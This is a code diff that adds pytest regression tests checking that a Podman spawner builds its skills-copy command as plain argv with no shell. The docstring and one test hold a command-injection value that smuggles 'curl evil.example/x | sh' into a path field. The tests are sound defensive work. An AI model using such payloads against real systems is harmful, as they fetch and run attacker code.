@@ -163,6 +163,107 @@ class TestPodmanSpawnerLabels:
             assert labels.get("spawned-by") == "workflow-runner"
 
 
+class TestPodmanSpawnerSkillsLoaderInjection:
+    """Tests for the skills extraction container's copy command (issue #202).
+
+    Regression coverage for a command-injection finding (docs/CODE-REVIEW.md
+    #3): skills_paths is a request-supplied field with no validation, and
+    the copy command used to be built via shell string interpolation
+    (`sh -c " && ".join(f"cp -r {p} ...")`), letting a value like
+    `/skills; curl evil.sh | sh` execute inside the transient container.
+    """
+
+    @staticmethod
+    def _setup_podman_mocks() -> tuple[MagicMock, MagicMock]:
+        mock_container = MagicMock()
+        mock_container.reload.return_value = None
+        mock_container.ports = {"8080/tcp": [{"HostPort": "12345"}]}
+
+        mock_podman_client = MagicMock()
+        mock_podman_client.__enter__ = MagicMock(return_value=mock_podman_client)
+        mock_podman_client.__exit__ = MagicMock(return_value=False)
+        mock_podman_client.containers.get.side_effect = Exception("not found")
+        mock_podman_client.containers.run.return_value = mock_container
+        mock_podman_client.volumes.create.return_value = None
+
+        mock_podman_cls = MagicMock(return_value=mock_podman_client)
+        mock_podman_module = types.ModuleType("podman")
+        mock_podman_module.PodmanClient = mock_podman_cls
+        return mock_podman_client, mock_podman_module
+
+    @pytest.mark.asyncio
+    async def test_skills_extraction_uses_argv_cp_not_shell(self) -> None:
+        """The skills extraction container's command is a plain argv cp, no shell."""
+        mock_podman_client, mock_podman_module = self._setup_podman_mocks()
+
+        with patch.dict(sys.modules, {"podman": mock_podman_module}):
+            spawner = PodmanSpawner(network="test")
+            await spawner._do_spawn(
+                "skills-agent",
+                "image:latest",
+                {},
+                skills_image="quay.io/example/skills:latest",
+                skills_paths=["/skills"],
+            )
+
+        run_calls = mock_podman_client.containers.run.call_args_list
+        skills_calls = [c for c in run_calls if c[0] and c[0][0] == "quay.io/example/skills:latest"]
+        assert len(skills_calls) == 1, "Expected exactly one run() call using the skills image"
+        command = skills_calls[0][1]["command"]
+
+        assert "sh" not in command, "skills extraction must not invoke a shell"
+        assert "-c" not in command
+        assert command[0] == "cp"
+
+    @pytest.mark.asyncio
+    async def test_skills_extraction_command_not_shell_interpolated_with_malicious_path(
+        self,
+    ) -> None:
+        """A skills_paths value with shell metacharacters is a literal argv item."""
+        mock_podman_client, mock_podman_module = self._setup_podman_mocks()
+        malicious_path = "/skills; curl evil.example/x | sh #"
+
+        with patch.dict(sys.modules, {"podman": mock_podman_module}):
+            spawner = PodmanSpawner(network="test")
+            await spawner._do_spawn(
+                "skills-agent-2",
+                "image:latest",
+                {},
+                skills_image="quay.io/example/skills:latest",
+                skills_paths=[malicious_path],
+            )
+
+        run_calls = mock_podman_client.containers.run.call_args_list
+        skills_calls = [c for c in run_calls if c[0] and c[0][0] == "quay.io/example/skills:latest"]
+        command = skills_calls[0][1]["command"]
+
+        assert malicious_path in command
+        assert not any("sh" == c or "-c" == c for c in command)
+
+    @pytest.mark.asyncio
+    async def test_skills_extraction_handles_multiple_paths(self) -> None:
+        """Multiple skills_paths entries all appear as separate argv items to cp."""
+        mock_podman_client, mock_podman_module = self._setup_podman_mocks()
+
+        with patch.dict(sys.modules, {"podman": mock_podman_module}):
+            spawner = PodmanSpawner(network="test")
+            await spawner._do_spawn(
+                "skills-agent-3",
+                "image:latest",
+                {},
+                skills_image="quay.io/example/skills:latest",
+                skills_paths=["/skills-a", "/skills-b"],
+            )
+
+        run_calls = mock_podman_client.containers.run.call_args_list
+        skills_calls = [c for c in run_calls if c[0] and c[0][0] == "quay.io/example/skills:latest"]
+        command = skills_calls[0][1]["command"]
+
+        assert "/skills-a" in command
+        assert "/skills-b" in command
+        assert command[-1] == "/skills-data"
+
+
 class TestPodmanSpawnerClient:
     """Tests for PodmanSpawner._client() and CONTAINER_HOST / DOCKER_HOST env vars."""
 
